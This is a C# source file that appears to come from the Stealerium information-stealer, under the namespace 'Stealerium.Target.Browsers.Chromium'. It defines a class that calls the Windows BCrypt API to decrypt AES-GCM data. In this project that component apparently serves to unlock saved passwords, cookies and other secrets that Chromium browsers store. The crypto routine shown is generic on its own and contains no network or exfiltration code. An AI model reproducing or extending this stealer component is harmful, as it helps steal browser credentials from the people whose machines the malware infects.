using System;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

namespace Stealerium.Target.Browsers.Chromium;

internal class CAesGcm
{
	public byte[] Decrypt(byte[] key, byte[] iv, byte[] aad, byte[] cipherText, byte[] authTag)
	{
		IntPtr intPtr = OpenAlgorithmProvider(CbCrypt.BCRYPT_AES_ALGORITHM, CbCrypt.MsPrimitiveProvider, CbCrypt.BCRYPT_CHAIN_MODE_GCM);
		IntPtr hKey;
		IntPtr hglobal = ImportKey(intPtr, key, out hKey);
		CbCrypt.AuthenticatedCipherModeInfo pPaddingInfo = new CbCrypt.AuthenticatedCipherModeInfo(iv, aad, authTag);
		byte[] array2;
		using (pPaddingInfo)
		{
			byte[] array = new byte[MaxAuthTagSize(intPtr)];
			int pcbResult = 0;
			uint num = CbCrypt.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref pPaddingInfo, array, array.Length, null, 0, ref pcbResult, 0);
			if (num != 0)
			{
				throw new CryptographicException($"BCrypt.BCryptDecrypt() (get size) failed with status code: {num}");
			}
			array2 = new byte[pcbResult];
			num = CbCrypt.BCryptDecrypt(hKey, cipherText, cipherText.Length, ref pPaddingInfo, array, array.Length, array2, array2.Length, ref pcbResult, 0);
			if (num == CbCrypt.StatusAuthTagMismatch)
			{
				throw new CryptographicException("BCrypt.BCryptDecrypt(): authentication tag mismatch");
			}
			if (num != 0)
			{
				throw new CryptographicException($"BCrypt.BCryptDecrypt() failed with status code:{num}");
			}
		}
		CbCrypt.BCryptDestroyKey(hKey);
		Marshal.FreeHGlobal(hglobal);
		CbCrypt.BCryptCloseAlgorithmProvider(intPtr, 0u);
		return array2;
	}

	private static int MaxAuthTagSize(IntPtr hAlg)
	{
		byte[] property = GetProperty(hAlg, CbCrypt.BCRYPT_AUTH_TAG_LENGTH);
		return BitConverter.ToInt32(new byte[4]
		{
			property[4],
			property[5],
			property[6],
			property[7]
		}, 0);
	}

	private static IntPtr OpenAlgorithmProvider(string alg, string provider, string chainingMode)
	{
		uint num = CbCrypt.BCryptOpenAlgorithmProvider(out var phAlgorithm, alg, provider, 0u);
		if (num != 0)
		{
			throw new CryptographicException($"BCrypt.BCryptOpenAlgorithmProvider() failed with status code:{num}");
		}
		byte[] bytes = Encoding.Unicode.GetBytes(chainingMode);
		num = CbCrypt.BCryptSetProperty(phAlgorithm, CbCrypt.BCRYPT_CHAINING_MODE, bytes, bytes.Length, 0);
		if (num != 0)
		{
			throw new CryptographicException($"BCrypt.BCryptSetAlgorithmProperty(BCrypt.BCRYPT_CHAINING_MODE, BCrypt.BCRYPT_CHAIN_MODE_GCM) failed with status code:{num}");
		}
		return phAlgorithm;
	}

	private IntPtr ImportKey(IntPtr hAlg, byte[] key, out IntPtr hKey)
	{
		int num = BitConverter.ToInt32(GetProperty(hAlg, CbCrypt.BCRYPT_OBJECT_LENGTH), 0);
		IntPtr intPtr = Marshal.AllocHGlobal(num);
		byte[] array = Concat(CbCrypt.BCRYPT_KEY_DATA_BLOB_MAGIC, BitConverter.GetBytes(1), BitConverter.GetBytes(key.Length), key);
		uint num2 = CbCrypt.BCryptImportKey(hAlg, IntPtr.Zero, CbCrypt.BCRYPT_KEY_DATA_BLOB, out hKey, intPtr, num, array, array.Length, 0u);
		if (num2 != 0)
		{
			throw new CryptographicException($"BCrypt.BCryptImportKey() failed with status code:{num2}");
		}
		return intPtr;
	}

	private static byte[] GetProperty(IntPtr hAlg, string name)
	{
		int pcbResult = 0;
		uint num = CbCrypt.BCryptGetProperty(hAlg, name, null, 0, ref pcbResult, 0u);
		if (num != 0)
		{
			throw new CryptographicException($"BCrypt.BCryptGetProperty() (get size) failed with status code:{num}");
		}
		byte[] array = new byte[pcbResult];
		num = CbCrypt.BCryptGetProperty(hAlg, name, array, array.Length, ref pcbResult, 0u);
		if (num != 0)
		{
			throw new CryptographicException($"BCrypt.BCryptGetProperty() failed with status code:{num}");
		}
		return array;
	}

	public byte[] Concat(params byte[][] arrays)
	{
		byte[] array2 = new byte[arrays.Where((byte[] array) => array != null).Sum((byte[] array) => array.Length) - 1 + 1];
		int num = 0;
		foreach (byte[] array3 in arrays)
		{
			if (array3 != null)
			{
				Buffer.BlockCopy(array3, 0, array2, num, array3.Length);
				num += array3.Length;
			}
		}
		return array2;
	}
}
